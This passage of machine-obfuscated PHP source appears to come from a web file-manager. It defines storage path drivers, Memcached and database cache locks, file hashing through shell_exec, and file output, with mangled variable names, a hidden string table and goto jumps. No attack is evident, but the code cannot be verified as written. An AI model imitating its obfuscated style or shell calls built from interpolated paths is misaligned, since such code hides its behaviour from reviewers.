IO::init($¬Ü©ş°™->pathParse[$„¼“¸€„[1234]]); } } $½Œ­…šŞ = $¬Ü©ş°™->path; $®¹ú†„º = str_replace($„¼“¸€„[1406], $„¼“¸€„[12], strtolower($¬Ü©ş°™->getType())); if ($®¹ú†„º == $„¼“¸€„[109]) { return array($„¼“¸€„[33] => $„¼“¸€„[109], $„¼“¸€„[1403] => $„¼“¸€„[12], $„¼“¸€„[87] => $½Œ­…šŞ, $„¼“¸€„[98] => $¬Ü©ş°™); } return array($„¼“¸€„[33] => $„¼“¸€„[950], $„¼“¸€„[1403] => $¬Ü©ş°™->pathDriver, $„¼“¸€„[87] => $½Œ­…šŞ, $„¼“¸€„[98] => $¬Ü©ş°™); } public static function pathDriverType($î¸ÏŒ¡) { return $î¸ÏŒ¡ ? self::driverType(IO::init($î¸ÏŒ¡)) : !1; } public static function pathDriverLocal($¸–Ş·¯ï) { $åĞèœß =& $_SERVER[±³—úê]; $ˆ™„º = $¸–Ş·¯ï ? self::driverType(IO::init($¸–Ş·¯ï)) : !1; return strtolower($ˆ™„º[$åĞèœß[33]]) == $åĞèœß[109] ? !0 : !1; } public static function allowCover($ì–«êÂ², $ÑÕŒ®İ = true) { $¾×¹óãÎ =& $_SERVER[±³—úê]; if (is_string($ì–«êÂ²)) { $ì–«êÂ² = IO::info($ì–«êÂ²); } if (!$ì–«êÂ² || $ì–«êÂ²[$¾×¹óãÎ[33]] == $¾×¹óãÎ[78] || $ì–«êÂ²[$¾×¹óãÎ[79]] <= 100) { return !1; } if (isset($ì–«êÂ²[$¾×¹óãÎ[1410]]) || !$ì–«êÂ²[$¾×¹óãÎ[87]]) { return !1; } if (isset($ì–«êÂ²[$¾×¹óãÎ[244]]) && !$ì–«êÂ²[$¾×¹óãÎ[244]]) { return !1; } static $Î’ı‡ÒŞ = false; if (!$Î’ı‡ÒŞ || !$ÑÕŒ®İ) { $×§ ¥ãû = self::driverType(IO::init($ì–«êÂ²[$¾×¹óãÎ[87]])); $ø¼’ÄÍØ = $×§ ¥ãû[$¾×¹óãÎ[98]]; $Î’ı‡ÒŞ = $¾×¹óãÎ[196]; if ($×§ ¥ãû[$¾×¹óãÎ[33]] == $¾×¹óãÎ[109]) { $Î’ı‡ÒŞ = $¾×¹óãÎ[1411]; } if ($×§ ¥ãû[$¾×¹óãÎ[98]] && is_array($×§ ¥ãû[$¾×¹óãÎ[98]]->config)) { $»Ñî‡’ = $×§ ¥ãû[$¾×¹óãÎ[98]]->config; if (isset($»Ñî‡’[$¾×¹óãÎ[1412]]) && $»Ñî‡’[$¾×¹óãÎ[1412]]) { $Î’ı‡ÒŞ = $¾×¹óãÎ[1411]; } } $ÏøĞ…‡™ = KodIO::defaultDriver(); if (strtolower($ÏøĞ…‡™[$¾×¹óãÎ[98]]) == $¾×¹óãÎ[109] && is_array($ÏøĞ…‡™[$¾×¹óãÎ[6]])) { $ŞÕÙéÀ— = $ÏøĞ…‡™[$¾×¹óãÎ[6]][$¾×¹óãÎ[1264]]; if (substr($ŞÕÙéÀ—, 0, 2) == $¾×¹óãÎ[1413]) { $ŞÕÙéÀ— = str_replace($¾×¹óãÎ[1413], BASIC_PATH, $ŞÕÙéÀ—); } $ŞÕÙéÀ— = str_replace($¾×¹óãÎ[266], $¾×¹óãÎ[8], $ŞÕÙéÀ—); if (substr($ì–«êÂ²[$¾×¹óãÎ[87]], 0, strlen($ŞÕÙéÀ—)) == $ŞÕÙéÀ—) { $Î’ı‡ÒŞ = $¾×¹óãÎ[196]; } } } return $Î’ı‡ÒŞ == $¾×¹óãÎ[1411] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($—ÌÙËû¦) { parent::__construct($—ÌÙËû¦); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($‘Èõ–¼) { $ÈêÎŠÊÛ =& $_SERVER[±³—úê]; if (substr($‘Èõ–¼, 0, 7) == $ÈêÎŠÊÛ[228]) { $‘Èõ–¼ = $ÈêÎŠÊÛ[229] . substr($‘Èõ–¼, 7); } header($ÈêÎŠÊÛ[175] . $‘Èõ–¼); die; } } goto e²ÈçòÓ¦à; AÓ”ˆï¦±‹: class CacheLockMemcached { public function lock($âÜ­‰‰, $˜Îàôò = 0) { $ş•åö×• = Cache::init(); $èëİ©ŒÏ = microtime(!0) + $˜Îàôò; while (microtime(!0) < $èëİ©ŒÏ) { $á¡Èæ‘ = $ş•åö×•->get($âÜ­‰‰); if (!$á¡Èæ‘ || $á¡Èæ‘ < microtime(!0)) { $ôº»—Ç¯ = $ş•åö×•->handle->add($âÜ­‰‰, $èëİ©ŒÏ, $˜Îàôò); if ($ôº»—Ç¯) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‚‚÷Šú) { return Cache::init()->get($‚‚÷Šú); } public function unlock($Şøã¾³) { return Cache::init()->remove($Şøã¾³); } } class CacheLockDatabase { public function lock($’§ı×, $ÀÒ§ššæ = 0) { $ªİë¥á£ = Model($_SERVER[±³—úê][909]); $Óµ‰Ó‚¦ = microtime(!0) + $ÀÒ§ššæ; while (microtime(!0) < $Óµ‰Ó‚¦) { $Ÿ¨º½« = $ªİë¥á£->get($’§ı×); if (!$Ÿ¨º½« || $Ÿ¨º½« < microtime(!0)) { $ıÙ‘Ïêé = $ªİë¥á£->set($’§ı×, $Óµ‰Ó‚¦); if ($ıÙ‘Ïêé) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($İ÷Â€Æ) { return Model($_SERVER[±³—úê][909])->get($İ÷Â€Æ); } public function unlock($¯Ñ½¾¦ï) { Model($_SERVER[±³—úê][909])->remove($¯Ñ½¾¦ï); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($®üÃãÌ², $¡É˜ê ó) { $˜Ã¦ª¶ =& $_SERVER[±³—úê]; if (!class_exists($˜Ã¦ª¶[948])) { show_json($˜Ã¦ª¶[949], !1); } $this->cacheTime = $¡É˜ê ó; $this->handle = new Memcached(); if (is_array($®üÃãÌ²[$˜Ã¦ª¶[950]]) && count($®üÃãÌ²[$˜Ã¦ª¶[950]]) >= 1) { foreach ($®üÃãÌ²[$˜Ã¦ª¶[950]] as $®ÃˆŒí) { $´ÖÅ»ïş = explode($˜Ã¦ª¶[4], $®ÃˆŒí); $this->handle->addServer($´ÖÅ»ïş[0], $´ÖÅ»ïş[1]); } } else { $this->handle->addServer($®üÃãÌ²[$˜Ã¦ª¶[208]], $®üÃãÌ²[$˜Ã¦ª¶[209]]); } } public function set($ÎŠµ¿, $‡ÍÑ¦´ø, $Ëêš—˜‹ = false) { $Ëêš—˜‹ = $Ëêš—˜‹ ? $Ëêš—˜‹ : $this->cacheTime; return $this->handle->set($ÎŠµ¿, $‡ÍÑ¦´ø, $Ëêš—˜‹); } public function get($¹Şä÷Àæ) { return $this->handle->get($¹Şä÷Àæ); } public function remove($ÜÖÉ´ÊÁ) { return $this->handle->delete($ÜÖÉ´ÊÁ); } public function deleteAll() { return $this->handle->flush(); } } goto eæÓÍ©Ñå; FÙôòñ ùµ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $³İò«èÂ =& $_SERVER[±³—úê]; $this->objectDriver = array($³İò«èÂ[60], $³İò«èÂ[61], $³İò«èÂ[62], $³İò«èÂ[63], $³İò«èÂ[64], $³İò«èÂ[65], $³İò«èÂ[66], $³İò«èÂ[67], $³İò«èÂ[68], $³İò«èÂ[69], $³İò«èÂ[70], $³İò«èÂ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($³ˆ¦Œ…“) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($³ˆ¦Œ…“, $_SERVER[±³—úê][8]); } return $³ˆ¦Œ…“; } public function iconvApp($´£şÇÆ¿) { return $´£şÇÆ¿; } public function iconvSystem($áÎôø ) { return $áÎôø ; } public function iconvTo($Î·Í¾», $é¬ßßÇŸ, $»ÑÌœ£Í) { $¬ëÄª§í =& $_SERVER[±³—úê]; if (!$Î·Í¾» || !function_exists($¬ëÄª§í[72])) { return $Î·Í¾»; } static $ªÏËØ”û = array(); $†ì¿Ğ½µ = $é¬ßßÇŸ . $¬ëÄª§í[73] . $»ÑÌœ£Í . $¬ëÄª§í[74] . $Î·Í¾»; if (isset($ªÏËØ”û[$†ì¿Ğ½µ])) { return $ªÏËØ”û[$†ì¿Ğ½µ]; } if (function_exists($¬ëÄª§í[75])) { $ÑÃÒä½ = @mb_convert_encoding($Î·Í¾», $»ÑÌœ£Í, $é¬ßßÇŸ); } else { $ÑÃÒä½ = @iconv($é¬ßßÇŸ, $»ÑÌœ£Í, $Î·Í¾»); } $ÑÃÒä½ = $ÑÃÒä½ ? $ÑÃÒä½ : $Î·Í¾»; if (strstr($ÑÃÒä½, $¬ëÄª§í[76])) { $ÑÃÒä½ = str_replace($¬ëÄª§í[76], $¬ëÄª§í[11], $ÑÃÒä½); } $ªÏËØ”û[$é¬ßßÇŸ . $¬ëÄª§í[73] . $»ÑÌœ£Í . $¬ëÄª§í[74] . $Î·Í¾»] = $ÑÃÒä½; $ªÏËØ”û[$»ÑÌœ£Í . $¬ëÄª§í[73] . $é¬ßßÇŸ . $¬ëÄª§í[74] . $Î·Í¾»] = $Î·Í¾»; $ªÏËØ”û[$»ÑÌœ£Í . $¬ëÄª§í[73] . $é¬ßßÇŸ . $¬ëÄª§í[74] . $ÑÃÒä½] = $Î·Í¾»; $ªÏËØ”û[$é¬ßßÇŸ . $¬ëÄª§í[73] . $»ÑÌœ£Í . $¬ëÄª§í[74] . $ÑÃÒä½] = $ÑÃÒä½; return $ÑÃÒä½; } public function getPathInner($°Õ‰ÌË½) { $ÅÓ‘­ø = IO::init($°Õ‰ÌË½); return $ÅÓ‘­ø->path; } public function getPathOuter($ş›Äà˜á) { $’È÷öÒã =& $_SERVER[±³—úê]; $¹×Õ™ò© = strlen(trim($this->pathBase, $’È÷öÒã[8])); $ş›Äà˜á = substr(trim($ş›Äà˜á, $’È÷öÒã[8]), $¹×Õ™ò©); return $this->pathDriver . $’È÷öÒã[8] . ltrim($ş›Äà˜á, $’È÷öÒã[8]); } public function isParentOf($„šµ®Ï©, $ÀĞÅöğ†) { $†¯äÆ™Ğ =& $_SERVER[±³—úê]; $„šµ®Ï© = rtrim(strtolower($„šµ®Ï©), $†¯äÆ™Ğ[8]) . $†¯äÆ™Ğ[8]; $ÀĞÅöğ† = rtrim(strtolower($ÀĞÅöğ†), $†¯äÆ™Ğ[8]) . $†¯äÆ™Ğ[8]; $Ë¹çéÂÃ = strpos($ÀĞÅöğ†, $„šµ®Ï©) === 0; return $Ë¹çéÂÃ; } public function getType() { $‹ïëóöö =& $_SERVER[±³—úê]; $“ŸßèÁ½ = str_replace($‹ïëóöö[77], $‹ïëóöö[12], get_class($this)); return strtolower($“ŸßèÁ½); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($û¼µûØâ, $Âø¬¤±) { $ÜÛÚŸ™ò =& $_SERVER[±³—úê]; $ŸÂÜÊáÒ = rtrim($û¼µûØâ, $ÜÛÚŸ™ò[8]) . $ÜÛÚŸ™ò[8] . $Âø¬¤±; $½°…´¦Ò = $this->exist($ŸÂÜÊáÒ); return $½°…´¦Ò ? $ŸÂÜÊáÒ : !1; } public function setModifyTime($¸üÊÁªÏ, $í’»•ÃÁ = '') { } public function renameObject($¢’ŒÑÎÍ, $–òÎ³µ) { $É˜¢–‚à = $–òÎ³µ; $¢’ŒÑÎÍ = $this->getPathOuter($¢’ŒÑÎÍ); $–òÎ³µ = $this->pathFather($¢’ŒÑÎÍ) . $–òÎ³µ; $æîñÅêô = IO::copy($¢’ŒÑÎÍ, $this->pathFather($¢’ŒÑÎÍ), REPEAT_RENAME_FOLDER, $É˜¢–‚à); if ($æîñÅêô) { IO::remove($¢’ŒÑÎÍ); } return $æîñÅêô ? $–òÎ³µ : !1; } public function tempFile($–‘â³¡€ = '', $´ş·™² = '') { if (!$–‘â³¡€) { $–‘â³¡€ = rand_string(15); } $Ÿ¥®æ¾š = TEMP_FILES . rand_string(15) . $_SERVER[±³—úê][8]; @mkdir($Ÿ¥®æ¾š, DEFAULT_PERRMISSIONS, !0); $à˜Ú•Î = $Ÿ¥®æ¾š . $–‘â³¡€; @touch($à˜Ú•Î); if ($´ş·™²) { file_put_contents($à˜Ú•Î, $´ş·™²); } return $à˜Ú•Î; } public function tempFileRemve($’”İë­¬) { @unlink($’”İë­¬); @rmdir($this->pathFather($’”İë­¬)); } public function mkfile($à¨Œ–±Î, $àúÙ¤îñ = '', $¥ÚÙË¾³ = REPEAT_RENAME) { } public function mkdir($ß¸²Êï, $€£œÄóÀ = REPEAT_SKIP) { } public function delFile($ã‹÷Í¨¨) { } public function delFolder($ÛêÌÃ´Õ) { } public function copyFile($âš“Ã­è, $€“’Ï”) { } public function moveFile($è™ğÊç, $Û…éÜÔø) { } public function remove($¿â¿ˆûä) { if ($this->isFile($¿â¿ˆûä)) { return $this->delFile($¿â¿ˆûä); } return $this->delFolder($¿â¿ˆûä); } public function rename($‰¤êäãá, $äıÎ¦ª) { } public function exist($“Ô‚¥Ò­) { } public function findByHash($Ü‰Ë¦…ş = '', $èäÈÃüó = '') { return !1; } public function isFile($Š–ßôß±) { } public function isFolder($Á‘™÷÷ç) { } public function size($²ıÉ†–é) { } public function info($Àë‡—Øã) { } public function infoSimple($ÄÙâ¹¹å) { return $this->info($ÄÙâ¹¹å); } public function infoAuth($÷•¬—Ì‹) { return $this->info($÷•¬—Ì‹); } public function infoFull($ù‚Ë“) { return $this->info($ù‚Ë“); } public function infoFullSimple($éœøİ£) { return $this->info($éœøİ£); } public function infoWithChildren($´¨Ö¤¶Ë) { $•¼Ä»÷ =& $_SERVER[±³—úê]; static $ô ÜªÀæ = array(); if (isset($ô ÜªÀæ[$´¨Ö¤¶Ë])) { return $ô ÜªÀæ[$´¨Ö¤¶Ë]; } $©ëº§ª– = $this->info($´¨Ö¤¶Ë); if ($©ëº§ª– && $©ëº§ª–[$•¼Ä»÷[33]] == $•¼Ä»÷[78]) { $óÕ›ù¨ = array($•¼Ä»÷[79] => 0, $•¼Ä»÷[80] => 0, $•¼Ä»÷[81] => 0); $this->infoChildren($´¨Ö¤¶Ë, $óÕ›ù¨); $©ëº§ª–[$•¼Ä»÷[79]] = $óÕ›ù¨[$•¼Ä»÷[79]]; $©ëº§ª–[$•¼Ä»÷[82]] = array($•¼Ä»÷[83] => $óÕ›ù¨[$•¼Ä»÷[80]], $•¼Ä»÷[84] => $óÕ›ù¨[$•¼Ä»÷[81]]); $ô ÜªÀæ[$´¨Ö¤¶Ë] = $©ëº§ª–; } return $©ëº§ª–; } public function listPath($ğ³èş¬, $µ„‰êå = false) { } public function has($ú¥üœ½§, $Ô÷şü¡Å = false, $Ï™öäİÙ = false) { } public function canRead($¨Ä¨¹­õ) { } public function canWrite($¨íôÃßŒ) { } public function getContent($ÉÃ†¥ ) { } public function setContent($ü·Çõ®Ã, $ŠÎÍÀèÇ = '') { } protected function infoChildren($Â’€›Íî, &$íÂ˜“†) { $ñô’¬¢ =& $_SERVER[±³—úê]; check_abort_echo(); $éŠ©ãÍ‚ = $this->listPath($Â’€›Íî, !0); $éŠ©ãÍ‚ = array_merge($éŠ©ãÍ‚[$ñô’¬¢[85]], $éŠ©ãÍ‚[$ñô’¬¢[86]]); foreach ($éŠ©ãÍ‚ as $‰°çºŸ¿) { if ($‰°çºŸ¿[$ñô’¬¢[33]] == $ñô’¬¢[78]) { $íÂ˜“†[$ñô’¬¢[81]]++; $†İ¼¢ÇÜ = $this->getPathInner($‰°çºŸ¿[$ñô’¬¢[87]]); $this->infoChildren($†İ¼¢ÇÜ, $íÂ˜“†); } else { $íÂ˜“†[$ñô’¬¢[80]]++; $íÂ˜“†[$ñô’¬¢[79]] += $‰°çºŸ¿[$ñô’¬¢[79]]; } } } public function fileSubstr($½Æ±úÑê, $ÙãË³ğû, $‘©ïî¿è) { } public function listAll($ÛÏœŸ¹Œ) { } public function listAllMake($Åôô«, &$¢Ñã†Ò») { $¯Îäš =& $_SERVER[±³—úê]; check_abort_echo(); $ŞÏÜ–¯û = $this->listPath($Åôô«, !0); if (!$ŞÏÜ–¯û) { return; } $…Ì…ª±İ = array_merge($ŞÏÜ–¯û[$¯Îäš[85]], $ŞÏÜ–¯û[$¯Îäš[86]]); foreach ($…Ì…ª±İ as $Õì„î™ ) { $öüÀÂ˜— = $Õì„î™ [$¯Îäš[33]] == $¯Îäš[78]; $òÏ—ÙÀª = array($¯Îäš[87] => $Õì„î™ [$¯Îäš[87]], $¯Îäš[78] => $öüÀÂ˜—); if (isset($Õì„î™ [$¯Îäš[79]])) { $òÏ—ÙÀª[$¯Îäš[79]] = $Õì„î™ [$¯Îäš[79]]; } if (isset($Õì„î™ [$¯Îäš[88]])) { $òÏ—ÙÀª[$¯Îäš[88]] = $Õì„î™ [$¯Îäš[88]]; } if (!$öüÀÂ˜—) { $¢Ñã†Ò»[] = $òÏ—ÙÀª; continue; } $¢Ñã†Ò»[] = $òÏ—ÙÀª; $Åš‚ü¦£ = $Õì„î™ [$¯Îäš[87]]; $‰†õŞşš = $this->pathDriver; if (substr($Õì„î™ [$¯Îäš[87]], 0, strlen($‰†õŞşš)) == $‰†õŞşš) { $Åš‚ü¦£ = substr($Åš‚ü¦£, strlen($‰†õŞşš)); } $this->listAllMake($Åš‚ü¦£, $¢Ñã†Ò»); } } public function listAllSimple($…«úÀ‘Ô, $ë±ÓÍ‘› = false) { $²¹×ªöŸ = $this->listAll($…«úÀ‘Ô); return $this->listAllSimpleMake($²¹×ªöŸ, $this->getPathOuter($…«úÀ‘Ô), $ë±ÓÍ‘›); } public function listAllSimpleMake($ÌÅõÔ”, $Ã ôÈÕ¶, $–áÒË•¦) { $³‹ö£Ê¬ =& $_SERVER[±³—úê]; $ŞÕÌ†ë² = array(); $Ã ôÈÕ¶ = rtrim(get_path_father($Ã ôÈÕ¶), $³‹ö£Ê¬[8]) . $³‹ö£Ê¬[8]; foreach ($ÌÅõÔ” as $˜›ï™üï) { $Åğ‘ƒÍË = array($³‹ö£Ê¬[87] => $˜›ï™üï[$³‹ö£Ê¬[87]], $³‹ö£Ê¬[89] => $˜›ï™üï[$³‹ö£Ê¬[87]], $³‹ö£Ê¬[78] => $˜›ï™üï[$³‹ö£Ê¬[78]]); if (isset($˜›ï™üï[$³‹ö£Ê¬[79]]) && !$˜›ï™üï[$³‹ö£Ê¬[78]]) { $Åğ‘ƒÍË[$³‹ö£Ê¬[79]] = $˜›ï™üï[$³‹ö£Ê¬[79]]; } if (isset($˜›ï™üï[$³‹ö£Ê¬[88]])) { $Åğ‘ƒÍË[$³‹ö£Ê¬[88]] = $˜›ï™üï[$³‹ö£Ê¬[88]]; } if (is_array($˜›ï™üï[$³‹ö£Ê¬[90]])) { $Åğ‘ƒÍË[$³‹ö£Ê¬[89]] = $˜›ï™üï[$³‹ö£Ê¬[90]][$³‹ö£Ê¬[87]]; $Åğ‘ƒÍË[$³‹ö£Ê¬[79]] = $˜›ï™üï[$³‹ö£Ê¬[90]][$³‹ö£Ê¬[79]]; $Åğ‘ƒÍË[$³‹ö£Ê¬[88]] = $˜›ï™üï[$³‹ö£Ê¬[90]][$³‹ö£Ê¬[88]]; } else { if (substr($˜›ï™üï[$³‹ö£Ê¬[87]], 0, strlen($Ã ôÈÕ¶)) == $Ã ôÈÕ¶) { $Åğ‘ƒÍË[$³‹ö£Ê¬[87]] = substr($˜›ï™üï[$³‹ö£Ê¬[87]], strlen($Ã ôÈÕ¶)); } } $È±ÚÍ¶Á = $˜›ï™üï[$³‹ö£Ê¬[78]] ? $³‹ö£Ê¬[8] : $³‹ö£Ê¬[12]; $Åğ‘ƒÍË[$³‹ö£Ê¬[89]] = rtrim($Åğ‘ƒÍË[$³‹ö£Ê¬[89]], $³‹ö£Ê¬[8]) . $È±ÚÍ¶Á; $Åğ‘ƒÍË[$³‹ö£Ê¬[87]] = $³‹ö£Ê¬[8] . trim($Åğ‘ƒÍË[$³‹ö£Ê¬[87]], $³‹ö£Ê¬[8]) . $È±ÚÍ¶Á; if (!$–áÒË•¦) { $ó‘ë“–ˆ = explode($³‹ö£Ê¬[8], trim($Åğ‘ƒÍË[$³‹ö£Ê¬[87]], $³‹ö£Ê¬[8])); $Åğ‘ƒÍË[$³‹ö£Ê¬[87]] = $³‹ö£Ê¬[8] . implode($³‹ö£Ê¬[8], array_slice($ó‘ë“–ˆ, 1)) . $È±ÚÍ¶Á; } $ŞÕÌ†ë²[] = $Åğ‘ƒÍË; } return array_sort_by($ŞÕÌ†ë², $³‹ö£Ê¬[87]); } public function upload($ŠóÅ©í, $İ¿÷É¿ª, $²š«öğ¯ = false, $ÀÅÙÁğ¼ = REPEAT_REPLACE) { } public function uploadFileByID($â•íĞ”õ, $­©ô®ÔÉ, $Å¼ÌìÒ) { } public function uploadFileByPath($èŒ¶­‚, $¸££ıó, $ãÁ”¦Ú = array()) { } public function isUploadServer() { $Ÿ™ñ•¶Õ =& $_SERVER[±³—úê]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ÿ™ñ•¶Õ[91]) { return !0; } return $GLOBALS[$Ÿ™ñ•¶Õ[6]][$Ÿ™ñ•¶Õ[92]][$Ÿ™ñ•¶Õ[93]]; } public function isFileOutServer() { $ñÃˆîíĞ =& $_SERVER[±³—úê]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ñÃˆîíĞ[91]) { return !0; } return $GLOBALS[$ñÃˆîíĞ[6]][$ñÃˆîíĞ[92]][$ñÃˆîíĞ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($®öÑ°Ï³) { $ÊÀ…²Óì =& $_SERVER[±³—úê]; if (!$this->isCdnHost()) { return $®öÑ°Ï³; } return str_replace(trim(get_url_root($®öÑ°Ï³), $ÊÀ…²Óì[8]), trim($this->cdnHost, $ÊÀ…²Óì[8]), $®öÑ°Ï³); } public function uploadLink($¬±àÂûã, $¢±ª¢”  = 0) { $ÏÊî²Ä =& $_SERVER[±³—úê]; if ($this->isUploadServer()) { return; } $¢Ï•ŸÇ© = $this->getType(); if (!in_array($¢Ï•ŸÇ©, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÌÕ÷Ì³ö = 1024 * 1024 * 10; $€Ë‚ Á¥ = $¢±ª¢”  <= $ÌÕ÷Ì³ö ? $ÏÊî²Ä[95] : $ÏÊî²Ä[96]; $èü¼Ìşœ = (!$¢±ª¢”  ? 1 : ceil($¢±ª¢”  / pow(1024, 3))) * 3600 * 4; $±óİ–íó = $this->{$€Ë‚ Á¥}($¬±àÂûã, $èü¼Ìşœ); if ($±óİ–íó) { $±óİ–íó[$ÏÊî²Ä[97]] = $¬±àÂûã; $±óİ–íó[$ÏÊî²Ä[98]] = $¢Ï•ŸÇ©; } return $±óİ–íó; } public function uploadFormData($® ²Œ…È, $ñÄĞñ¾ = 3600) { } public function uploadMultiData($ÒğÍ¾ëù, $Ğ‡”àø­ = 3600) { } public function multiUploadFormData($’‘³¿ìÛ, $â¶¢ŒÆó = 3600) { return $this->uploadMultiData($’‘³¿ìÛ, $â¶¢ŒÆó); } public function download($íÊÕîÃı, $Î½·Öòı) { } public function ext($¤Û²†‚) { $»â€Öƒ© =& $_SERVER[±³—úê]; if (strpos($¤Û²†‚, $»â€Öƒ©[8]) === -1) { $òÆ¡‰­ = $¤Û²†‚; } else { $òÆ¡‰­ = $this->pathThis($¤Û²†‚); } $–³í­ğ = $»â€Öƒ©[12]; if (strstr($òÆ¡‰­, $»â€Öƒ©[10])) { $–³í­ğ = substr($òÆ¡‰­, strrpos($òÆ¡‰­, $»â€Öƒ©[10]) + 1); $–³í­ğ = strtolower($–³í­ğ); } if (strlen($–³í­ğ) > 3 && preg_match($»â€Öƒ©[99], $–³í­ğ, $‚Ù¯²ÀÛ)) { $–³í­ğ = $»â€Öƒ©[12]; } return $–³í­ğ; } public function pathThis($ØÃı‹¤µ) { $ñóªÖ—å =& $_SERVER[±³—úê]; $ØÃı‹¤µ = str_replace($ñóªÖ—å[100], $ñóªÖ—å[8], rtrim($ØÃı‹¤µ, $ñóªÖ—å[8])); $‡¢Ã¬² = strrpos($ØÃı‹¤µ, $ñóªÖ—å[8]); if ($‡¢Ã¬² === !1) { return $ØÃı‹¤µ; } return substr($ØÃı‹¤µ, $‡¢Ã¬² + 1); } public function pathFather($äÛ‰±á) { $Ú¶€Çç =& $_SERVER[±³—úê]; $äÛ‰±á = str_replace($Ú¶€Çç[100], $Ú¶€Çç[8], rtrim($äÛ‰±á, $Ú¶€Çç[8])); $¾Æ‡Óòû = strrpos($äÛ‰±á, $Ú¶€Çç[8]); if ($¾Æ‡Óòû === !1) { return $Ú¶€Çç[12]; } return substr($äÛ‰±á, 0, $¾Æ‡Óòû + 1); } public function hashSimple($ÛËŒåéÛ) { $Ë÷²äÊ =& $_SERVER[±³—úê]; if (!$ÛËŒåéÛ) { return md5($Ë÷²äÊ[12]); } $…ÛŠ™• = $this->size($ÛËŒåéÛ); $¼ß®—“ş = 200; $¡×ú‡  = 50; if ($…ÛŠ™• <= $¼ß®—“ş * $¡×ú‡ ) { return $this->hashMd5($ÛËŒåéÛ) . $…ÛŠ™•; } $ˆ¢ùÓã§ = intval($…ÛŠ™• / $¡×ú‡ ); $Ä×ÇäşÛ = $Ë÷²äÊ[12]; for ($ÕÊİ¡« = 0; $ÕÊİ¡« < $¡×ú‡ ; $ÕÊİ¡«++) { $Ä×ÇäşÛ .= $this->fileSubstr($ÛËŒåéÛ, $ˆ¢ùÓã§ * $ÕÊİ¡«, $¼ß®—“ş); } $Ä×ÇäşÛ .= $this->fileSubstr($ÛËŒåéÛ, $…ÛŠ™• - $¼ß®—“ş, $¼ß®—“ş); return md5($Ä×ÇäşÛ) . $…ÛŠ™•; } public static $md5Cache = array(); public function hashMd5($İÊ¯Æˆ) { if (!$İÊ¯Æˆ) { return md5($_SERVER[±³—úê][12]); } $İÊ¯Æˆ = $this->iconvSystem($İÊ¯Æˆ); if (isset(self::$md5Cache[$İÊ¯Æˆ])) { return self::$md5Cache[$İÊ¯Æˆ]; } self::$md5Cache[$İÊ¯Æˆ] = $this->hashMd5Shell($İÊ¯Æˆ); if (!self::$md5Cache[$İÊ¯Æˆ]) { self::$md5Cache[$İÊ¯Æˆ] = @md5_file($İÊ¯Æˆ); } return self::$md5Cache[$İÊ¯Æˆ]; } private function hashMd5Shell($¬Êğ¤Í¶) { $Ş‹ åÚü =& $_SERVER[±³—úê]; if (!$¬Êğ¤Í¶) { return md5($Ş‹ åÚü[12]); } if (!function_exists($Ş‹ åÚü[101])) { return !1; } $…˜‡ƒíß = array($Ş‹ åÚü[102], $Ş‹ åÚü[103]); $‹î„×ìå = Cache::get($Ş‹ åÚü[104]); if (!$‹î„×ìå) { $ÃÆ€ó¬ = BASIC_PATH . $Ş‹ åÚü[105]; $È‡¾Ü¶ = md5_file($ÃÆ€ó¬); $‹î„×ìå = $Ş‹ åÚü[106]; foreach ($…˜‡ƒíß as $ÀàîÎ†İ) { $Àúã‰Ñ = shell_exec($ÀàîÎ†İ . "\x20\x22{$ÃÆ€ó¬}\x22"); if ($Àúã‰Ñ && substr(trim($Àúã‰Ñ), 0, 32) == $È‡¾Ü¶) { $‹î„×ìå = $ÀàîÎ†İ; break; } } Cache::set($Ş‹ åÚü[104], $‹î„×ìå, 3600); } if ($‹î„×ìå == $Ş‹ åÚü[106]) { return !1; } $Àúã‰Ñ = shell_exec($‹î„×ìå . "\x20\42{$¬Êğ¤Í¶}\42"); $Àúã‰Ñ = str_replace($Ş‹ åÚü[107], $Ş‹ åÚü[12], $Àúã‰Ñ); return substr($Àúã‰Ñ, 0, 32); } public function link($¬Ã±Äìµ) { return $¬Ã±Äìµ; } public function fileOut($¸üê»®‰, $®…Ô€ÑÛ = false, $ÈìÌ¿ÅÛ = false, $È¸’éÂ± = '') { $—¸…¸çß =& $_SERVER[±³—úê]; $this->cacheMethod(null, null); if (!$¸üê»®‰ || !$this->exist($¸üê»®‰)) { show_json(LNG($—¸…¸çß[108]), !1, $ÈìÌ¿ÅÛ); } $€êìƒŞ = $this->getType() == $—¸…¸çß[109]; $ñµÙòßï = $GLOBALS[$—¸…¸çß[6]][$—¸…¸çß[92]][$—¸…¸çß[110]][$—¸…¸çß[111]]; $ñÂàêÚ¥ = (double) $GLOBALS[$—¸…¸çß[6]][$—¸…¸çß[92]][$—¸…¸çß[110]][$—¸…¸çß[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¦‡ş“÷¤ = $this->infoFull($¸üê»®‰); $ıîœ¨‘³ = $¦‡ş“÷¤[$—¸…¸çß[79]]; $àÈÚ‚’» = gmdate($—¸…¸çß[113], $¦‡ş“÷¤[$—¸…¸çß[88]]); $ï“¡ÛúŠ = $ÈìÌ¿ÅÛ ? $ÈìÌ¿ÅÛ : $this->iconvApp($¦‡ş“÷¤[$—¸…¸çß[32]]); $æŒ†ÁçÉ = 0; $œ™ï˜É = $ıîœ¨‘³ - 1; $õé¯ç¯Û = $this->ext($ï“¡ÛúŠ); if (in_array($õé¯ç¯Û, array($—¸…¸çß[114], $—¸…¸çß[115], $—¸…¸çß[116], $—¸…¸çß[117]))) { $õé¯ç¯Û = $—¸…¸çß[118]; } if (in_array($õé¯ç¯Û, array($—¸…¸çß[119]))) { $õé¯ç¯Û = $—¸…¸çß[120]; } if (!$È¸’éÂ±) { $È¸’éÂ± = md5($àÈÚ‚’» . 